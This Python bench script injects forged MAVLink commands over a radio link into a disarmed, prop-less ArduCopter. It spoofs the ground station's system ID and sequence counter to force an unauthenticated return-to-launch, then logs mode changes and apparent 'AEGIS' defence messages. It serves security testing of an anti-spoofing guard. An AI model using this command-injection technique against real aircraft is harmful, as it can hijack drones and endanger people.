# ruff: noqa  (bench script: quick one-off driver against a real, DISARMED, prop-less flight controller; not library code)
"""Unsigned-link attack sequence against a DISARMED, prop-less ArduCopter through the radio + bridge. Aborts if the vehicle ever reports armed.
usage: px_attack.py PORT LABEL   -> prints a per-event table, writes px_attack_<LABEL>.json next to this script"""
import sys, time, json, os, serial
from pymavlink.dialects.v20 import ardupilotmega as mav

port, label = sys.argv[1], sys.argv[2]
ser = serial.Serial(port, 115200, timeout=0.02)
mk = lambda s, c: mav.MAVLink(None, srcSystem=s, srcComponent=c)
gcs, evil, spoof, flooder = mk(255, 190), mk(77, 1), mk(255, 190), mk(77, 1)
spoof.seq = 100; evil.seq = 40; flooder.seq = 7  # each sender has its own counter, as separate transmitters would
rx = mav.MAVLink(None); rx.robust_parsing = True
STABILIZE, ALT_HOLD, LOITER, LAND, RTL = 0, 2, 5, 9, 6
NAMES = {0: "STABILIZE", 2: "ALT_HOLD", 5: "LOITER", 6: "RTL", 9: "LAND", 4: "GUIDED", 3: "AUTO"}
T0 = time.time(); st = {"mode": None, "armed": None, "hb": 0}; texts = []; acks = []; mode_log = []; next_hb = [T0]
def now(): return round(time.time() - T0, 1)
def send(m, msg):
    ser.write(msg.pack(m)); m.seq = (m.seq + 1) % 256  # pymavlink's pack() does not advance the counter; send() does
def cmd(m, command, p1=0, p2=0, tsys=1):
    return m.command_long_encode(tsys, 1, command, 0, p1, p2, 0, 0, 0, 0, 0)
def poll(sec):
    end = time.time() + sec
    while time.time() < end:
        if time.time() >= next_hb[0]:
            send(gcs, gcs.heartbeat_encode(mav.MAV_TYPE_GCS, mav.MAV_AUTOPILOT_INVALID, 0, 0, 0)); next_hb[0] += 1
        for b in ser.read(2048):
            r = rx.parse_char(bytes([b]))
            if r is None or r.get_type() == "BAD_DATA": continue
            t = r.get_type()
            if t == "HEARTBEAT" and r.get_srcSystem() == 1 and r.get_srcComponent() == 1:
                st["hb"] += 1; armed = bool(r.base_mode & 128)
                if st["mode"] != r.custom_mode: mode_log.append((now(), NAMES.get(r.custom_mode, r.custom_mode)))
                st["mode"], st["armed"] = r.custom_mode, armed
                if armed: raise SystemExit(f"ABORT: vehicle reports ARMED at t={now()}")
            elif t == "STATUSTEXT": texts.append((now(), r.get_srcSystem(), r.text))
            elif t == "COMMAND_ACK": acks.append((now(), r.get_srcSystem(), r.command, r.result))
mode_name = lambda: NAMES.get(st["mode"], st["mode"])
def restore(): send(gcs, cmd(gcs, 176, 1, STABILIZE))
def window(t_a): return {"texts": [(t, x) for t, s, x in texts if t >= t_a], "acks": [(t, c, r) for t, s, c, r in acks if t >= t_a]}

poll(3)
for stream in (2, 6, 10): send(gcs, gcs.request_data_stream_encode(1, 1, stream, 1, 1))
poll(7)
if st["armed"] is None: raise SystemExit("no heartbeat from the vehicle")
print(f"start: mode {mode_name()} armed {st['armed']}")
events = []
def event(name, desc, attack, extra_wait=6):
    t_a = now(); before = mode_name(); attack(); poll(extra_wait); after = mode_name(); restore(); poll(6)
    w = window(t_a); events.append({"event": name, "what": desc, "t": t_a, "mode_before": before, "mode_after_attack": after, "mode_after_restore": mode_name(), **w})
    print(f"{t_a:6.1f} {name:22s} mode {before}->{after} (restored {mode_name()}) acks={w['acks']} texts={[x for _, x in w['texts']][:4]}", flush=True)


def tracking_rtl():
    spoof.seq = gcs.seq  # a forger that watched the pilot's frames and continues the pilot's own counter
    send(spoof, cmd(spoof, 20))
event("forged_rtl_counter_tracking255", "RTL from sysid 255 using the pilot's own next sequence number", tracking_rtl)
event("forged_rtl_counter_tracking255_b", "same again", tracking_rtl)
poll(3)
print("AEGIS texts:", [(t, x) for t, s, x in texts if str(x).startswith("AEGIS")][:14])
print("mode log:", mode_log)
